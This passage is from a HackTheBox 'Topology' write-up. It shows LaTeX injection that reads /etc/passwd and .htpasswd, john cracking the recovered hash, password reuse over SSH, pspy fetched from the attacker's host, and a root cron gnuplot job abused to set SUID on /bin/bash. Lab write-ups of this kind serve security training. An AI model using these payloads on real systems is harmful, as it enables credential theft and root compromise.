src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%202.png"/></a></figure><p id="dc253e80-f426-429b-a06f-784d05f64766" class="">We can enter <mark class="highlight-yellow_background"><strong>LaTeX equations</strong></mark> in a field and generate a PNG from it. Here is an example with <mark class="highlight-yellow_background"><strong>\frac{52}{142+y}</strong></mark> : </p><figure id="e3028b07-26dc-477f-8293-b6ce4c9be917" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%203.png"><img style="width:274px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%203.png"/></a></figure><h1 id="80d9dbe3-a11f-4028-85cc-c9b8757b4cb1" class="">Initial access</h1><p id="1ed33890-6e22-484e-a3c2-ec9eb6daef7e" class="">Since we can enter LaTeX code in this field, we may be able to inject malicious LaTeX code to read arbitrary files. Let’s try to read <mark class="highlight-yellow_background"><strong>/etc/passwd</strong></mark> with the following payload : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1b74858a-93d5-4765-9f8e-5a7504235ec7" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">\newread\file
+\openin\file=/etc/passwd
+\read\file to\line
+\text{\line}
+\closein\file</code></pre><p id="5dc9668f-182f-4ae9-acc8-b5f40ead4a13" class="">It gives us this PNG : </p><figure id="8ff93eb3-8d93-470b-af13-dee1225ba1fa" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%204.png"><img style="width:607px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%204.png"/></a></figure><p id="f2ac5e8a-f6b5-4656-b7cf-df792fc1fd59" class="">So we are able to read arbitrary files. This payload can only read the first line of a file, but we don’t need to read more lines if we want to read the <mark class="highlight-yellow_background"><strong>.htpasswd</strong></mark> file in the <mark class="highlight-yellow_background"><strong>dev</strong></mark> virtual host. By default, the root of the <mark class="highlight-yellow_background"><strong>dev</strong></mark> virtual host should be located in <mark class="highlight-yellow_background"><strong>/var/www/dev/</strong></mark>. Let’s try to read this file with the following payload : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d445ab82-52cf-4c2c-afe4-9636dd20cc87" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">\newread\file
+\openin\file=/var/www/dev/.htpasswd
+\read\file to\line
+\text{\line}
+\closein\file</code></pre><p id="a41f04d2-60ca-4d05-8679-cf5746065189" class="">It gives us this response : </p><figure id="96273940-446f-4765-8bc0-99e3facc6f5f" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%205.png"><img style="width:1857px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%205.png"/></a></figure><p id="66c13cff-6713-48df-aebf-53e381f2aff6" class="">We have an error. This could be due to the “<mark class="highlight-yellow_background"><strong>$</strong></mark>” signs in the hash in the <strong><mark class="highlight-yellow_background">.htpasswd</mark></strong> file since those characters have a special meaning in LaTeX. They are used to start and finish math mode. If we take a look at the root of the <mark class="highlight-yellow_background"><strong>latex</strong></mark> virtual host, we can find something interesting : </p><figure id="903d4736-97db-4a1c-ba31-7bdf3c8cbb22" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%206.png"><img style="width:528px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%206.png"/></a></figure><p id="3a80a5eb-0ada-4091-a0c3-f7bfc6135a28" class="">We can see the <mark class="highlight-yellow_background"><strong>equationtest.tex</strong></mark> file. It contains a LaTeX script. Let’s take a look at it : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a964acca-5e23-4206-a541-629ab389d478" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat ~/Downloads/equationtest.tex
+\documentclass{standalone}
+\input{header}
+\begin{document}
+
+$ \int_{a}^b\int_{c}^d f(x,y)dxdy $
+
+\end{document}</code></pre><p id="f6e47b63-315d-409b-9cbd-df6b01b2b5cd" class="">From this file, we can deduce that our input on the <mark class="highlight-yellow_background"><strong>equation.php</strong></mark> page will be inserted between two “<mark class="highlight-yellow_background"><strong>$</strong></mark>” signs. Let’s take for example this hash : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e96f88bc-60bb-4536-a91c-2abd447e1ddc" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">$apr1$rvk6cUzh$iYXx6JO0dG3.gOtFm1cRX0</code></pre><p id="7ae9d241-4b56-4d58-8999-b22456cbb1fa" class="">If this type of hash is contained in the file we are trying to read, it will be interpreted like so : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5d20157-2820-47f2-94d9-da41e00610cc" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">\documentclass{standalone}
+\input{header}
+\begin{document}
+
+$ $apr1$rvk6cUzh$iYXx6JO0dG3.gOtFm1cRX0 $
+
+\end{document}</code></pre><p id="7d4f6426-3065-4130-ae93-8e9cd794f235" class="">In LaTeX, if we open math mode with a dollar sign, we need to close it or it will cause an error. Here, we can see that there is an odd number of dollar signs. This may be the cause of the error when we try to read <mark class="highlight-yellow_background"><strong>/var/www/dev/.htpasswd</strong></mark>. To avoid this error, we need to add an extra dollar sign after we append the content of <mark class="highlight-yellow_background"><strong>.htpasswd</strong></mark> in our payload : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4da0ed4f-b74d-43d1-bc38-d5265fe19b6a" class="code"><code class="language-LaTeX" style="white-space:pre-wrap;word-break:break-all">\newread\file
+\openin\file=/var/www/dev/.htpasswd
+\read\file to\line
+\line$
+\closein\file</code></pre><p id="05d30723-9447-4fd0-9440-41dd19a720be" class="">It gives us this PNG : </p><figure id="e041d105-d1f6-4017-bdda-fceb73267cd8" class="image"><a href="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%207.png"><img style="width:993px" src="HackTheBox%20-%20Topology%20(Easy)%2022ab633b339b452293a3ed2cb53ef6c4/Untitled%207.png"/></a></figure><p id="dafda6dc-20db-4c5f-8a5d-00daa9209e3f" class="">We successfully read the content of <mark class="highlight-yellow_background"><strong>/var/www/dev/.htpasswd</strong></mark>. Since the dollar signs are interpreted as math mode start and stop, they are missing from the output. Since the dollar signs are always at the same place in this type of hash, we can take example on another hash of the same type (apr1) to place the missing dollar signs. It gives us the following hash : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1abd937c-ec61-45b4-b761-be730bb055f4" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ cat hash.txt                    
+$apr1$1ONUB/S2$58eeNV[HIDDEN]</code></pre><p id="b52b23f8-8cf5-4a27-81a6-aa5b2f4e5423" class="">Let’s try to crack this hash : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12d5b1f3-6ce0-46b8-9d7c-c88acc9cbedb" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+[HIDDEN]       (?)     
+1g 0:00:00:06 DONE (2023-06-17 08:57) 0.1506g/s 149956p/s 149956c/s 149956C/s calebd1..caitlyn09
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre><p id="4248c9cf-56c2-4334-9cb8-b7b0b0be1592" class="">Now we have the credentials for the Basic Authentication on the <mark class="highlight-yellow_background"><strong>dev</strong></mark> virtual host. But we can try to use those credentials to login via <mark class="highlight-yellow_background"><strong>SSH</strong></mark> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e450c947-f1e6-409d-8639-da756d827c9f" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Topology]
+└─$ ssh vdaisley@10.10.11.217
+vdaisley@10.10.11.217&#x27;s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+vdaisley@topology:~$</code></pre><p id="fcd30392-42c7-4b17-b4d2-3499ed4a757f" class="">Now we have a foothold on the system as <mark class="highlight-yellow_background"><strong>vdaisley</strong></mark>.</p><h1 id="9359a646-8841-40e6-817a-9016e80e0177" class="">Post-exploitation</h1><h2 id="bbc90d33-8187-4dde-a506-9165c9e1837d" class=""><mark class="highlight-blue">Local enumeration</mark></h2><p id="a4c4d171-e511-4904-b313-d00b76fdd8f2" class="">Let’s take a look at the running processes using <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce27b932-afff-4ced-bbb7-c1ed5d9c8638" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">vdaisley@topology:~$ wget http://10.10.14.3/pspy64
+--2023-06-17 09:01:18--  http://10.10.14.3/pspy64
+Connecting to 10.10.14.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64          100%[=====&gt;]   2.96M  7.88MB/s    in 0.4s    
+
+2023-06-17 09:01:18 (7.88 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+vdaisley@topology:~$ chmod +x pspy64
+vdaisley@topology:~$ ./pspy64 
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/06/17 09:01:36 CMD: UID=1007  PID=5955   | ./pspy64 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5893   | -bash 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5892   | sshd: vdaisley@pts/0 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5847   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                   
+2023/06/17 09:01:36 CMD: UID=113   PID=5828   | /usr/libexec/rtkit-daemon 
+2023/06/17 09:01:36 CMD: UID=1007  PID=5807   | /usr/bin/pulseaudio --daemonize=no --log-target=journal 
+[CROPPED]
+2023/06/17 09:02:01 CMD: UID=0     PID=5972   | gnuplot /opt/gnuplot/loadplot.plt 
+2023/06/17 09:02:01 CMD: UID=0     PID=5971   | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
+2023/06/17 09:02:01 CMD: UID=0     PID=5970   | /bin/sh -c find &quot;/opt/gnuplot&quot; -name &quot;*.plt&quot; -exec gnuplot {} \; 
+2023/06/17 09:02:01 CMD: UID=0     PID=5969   | /usr/sbin/CRON -f 
+2023/06/17 09:02:01 CMD: UID=0     PID=5968   | /usr/sbin/CRON -f 
+2023/06/17 09:02:01 CMD: UID=0     PID=5978   | cut -d   -f3,7 
+2023/06/17 09:02:01 CMD: UID=0     PID=5977   | tr -s   
+2023/06/17 09:02:01 CMD: UID=0     PID=5976   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5974   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5982   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5981   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5980   | /bin/sh /opt/gnuplot/getdata.sh 
+2023/06/17 09:02:01 CMD: UID=0     PID=5979   | uptime 
+2023/06/17 09:02:01 CMD: UID=0     PID=5985   | gnuplot /opt/gnuplot/networkplot.plt</code></pre><p id="18ef71dc-9774-4782-9d61-2d451e440345" class="">It looks like the <mark class="highlight-yellow_background"><strong>root</strong></mark> user is repeatedly running the command <mark class="highlight-yellow_background"><strong>find /opt/gnuplot -name *.plt -exec gnuplot {} ;</strong></mark>. It finds every <mark class="highlight-yellow_background"><strong>.plt</strong></mark> files in <mark class="highlight-yellow_background"><strong>/opt/gnuplot</strong></mark> and runs them with <mark class="highlight-yellow_background"><strong>gnuplot</strong></mark>. Let’s see what permissions we have on <mark class="highlight-yellow_background"><strong>/opt/gnuplot</strong></mark> :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa3820ca-d0fa-495d-9711-4f93d3f787e0" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">vdaisley@topology:~$ ls -la /opt/
+total 12
+drwxr-xr-x  3 root root 4096 May 19 13:04 .
+drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
+drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot</code></pre><p id="ef53b53c-2da9-4b4d-876c-745353efe157" class="">We have <mark class="highlight-yellow_background"><strong>write permissions</strong></mark> in <mark class="highlight-yellow_background"><strong>/opt/gnuplot</strong></mark>. </p><h2 id="15618828-1a01-4bc7-9a70-9bc51a83982f" class=""><mark class="highlight-blue">Privilege escalation</mark></h2><p id="e1256377-3b67-4583-b6b8-41bd51e41d06" class="">We can write a malicious <mark class="highlight-yellow_background"><strong>.plt</strong></mark> file that will execute a system command to set the <mark class="highlight-yellow_background"><strong>SUID bit</strong></mark> on <mark class="highlight-yellow_background"><strong>/bin/bash</strong></mark> to gain a shell as <mark class="highlight-yellow_background"><strong>root</strong></mark> since we can execute system commands with <mark class="highlight-yellow_background"><strong>gnuplot</strong></mark> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a56d32b2-ba69-4d1c-b297-0176fcc3c130" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">vdaisley@topology:~$ echo &#x27;system(&quot;chmod +s /bin/bash&quot;)&#x27; &gt; /opt/gnuplot/exploit.plt
+vdaisley@topology:~$ chmod +x /opt/gnuplot/exploit.plt</code></pre><p id="9b06aaf5-1df8-46b6-bbf1-5fb69a642c8c" class="">Now, we need to wait till the <mark class="highlight-yellow_background"><strong>root</strong></mark> user runs the command again. After waiting some times, let’s take a look at the permissions on <mark class="highlight-yellow_background"><strong>/bin/bash</strong></mark> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1f805fd5-48b5-4ddd-9550-eb6f8d90d9b0" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">vdaisley@topology:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash</code></pre><p id="194ffe7e-b706-4835-b4be-e21d3fb2b8e9" class="">The <mark class="highlight-yellow_background"><strong>SUID bit</strong></mark> was successfully activated on <mark class="highlight-yellow_background"><strong>/bin/bash</strong></mark>. Now we can spawn a shell as <mark class="highlight-yellow_background"><strong>root</strong></mark> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1e745322-5074-4735-924d-ffe1f1554bbd" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">vdaisley@topology:~$ bash -p
+bash-5.0# whoami
+root</code></pre><h1 id="bc126190-9011-48df-bfdc-2de4a485411b" class="">Clearing tracks</h1><table id="5d8973e0-b689-4e14-8935-aee5ea43a704" class="simple-table"><thead class="simple-table-header"><tr id="b7d37a2b-4ec8-4b6a-bac5-098203cbc647"><th id="xDBb" class="simple-table-header-color simple-table-header" style="width:653px">Step</th><th id="^z&gt;Y" class="simple-table-header-color simple-table-header" style="width:653px">Tracks to remove</th></tr></thead><tbody><tr id="1c3f566f-a677-456e-9ec1-99a7054361c3"><td id="xDBb" class="" style="width:653px">Post-exploitati<mark class="highlight-default">on - Privilege escalation</mark></td><td id="^z&gt;Y" class="" style="width:653px">- Remove SUID from /bin/bash<br/>- Remove <br/><mark class="highlight-default">exploit.plt in /opt/gnuplot/</mark></td></tr><tr id="df4d41ad-7596-4e42-b1d0-8de36b600917"><td id="xDBb" class="" style="width:653px">Post-exploitation - Local enumeration</td><td id="^z&gt;Y" class="" style="width:653px"><mark class="highlight-default">- Remove pspy64 from /home/vdaisley</mark></td></tr></tbody></table><h1 id="49bb7548-d466-4042-8882-31dcd9e11123" class="">Vulnerabilities summary</h1><h2 id="0f50dbd1-02e3-49f9-bf3f-a68e0779e774" class=""><mark class="highlight-blue">Arbitrary File Read</mark></h2><table id="c9c584db-ea8d-4d96-9a99-64a234b4a2ed" class="simple-table"><thead class="simple-table-header"><tr id="f4fa591f-1e57-4100-8e25-e7a2fc57ae80"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="72fe66c2-a18d-441d-adeb-8d06b33cbd5d"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Web server</td></tr><tr id="b231bda5-c2ca-43a4-a705-642bf2d381a5"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>7.5</strong></td></tr><tr id="3940ee88-6ccc-421e-afa8-7be5f13a7e1e"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><mark class="highlight-red_background"><strong>HIGH</strong></mark></td></tr><tr id="7641fd77-b7f4-4c3f-bf3a-961de484a576"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Network</strong></td></tr><tr id="0c5f83c3-3eea-4e4f-b1e1-a554fc3a6e73"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to partially read arbitrary files. This can lead to sensitive informations disclosure. During the assessment, we found the password hash of a local user.<br/><br/>This has a <br/><strong><mark class="highlight-red">high</mark></strong> impact on the <mark class="highlight-blue"><strong>confidentiality</strong></mark><mark class="highlight-blue"> </mark>of the affected component.</td></tr><tr id="39c8a32e-852b-4a93-83f3-b5eb10768c9b"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">Add filters to user input in the request made to <mark class="highlight-yellow_background"><strong>equation.php</strong></mark>. For example, create a whitelist of all authorized commands. <br/><br/>Or you could set up a blacklist containing the malicious commands used during the assessment (<br/><mark class="highlight-yellow_background"><strong>\newread</strong></mark>, <mark class="highlight-yellow_background"><strong>\openin</strong></mark>, <mark class="highlight-yellow_background"><strong>\read</strong></mark>).</td></tr></tbody></table><h2 id="c57dfcd2-af3a-439d-b3ce-81d4bea0f672" class=""><mark class="highlight-blue">Weak password</mark></h2><table id="dcb10967-3fea-42bb-a100-743fa88411d5" class="simple-table"><thead class="simple-table-header"><tr id="9ea655eb-6793-480b-9418-0bc47f9b8957"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="883e715d-638f-491d-b0b0-4f41ccee999f"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Local system</td></tr><tr id="943757a9-4d34-472a-bb52-63fcef1f6965"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 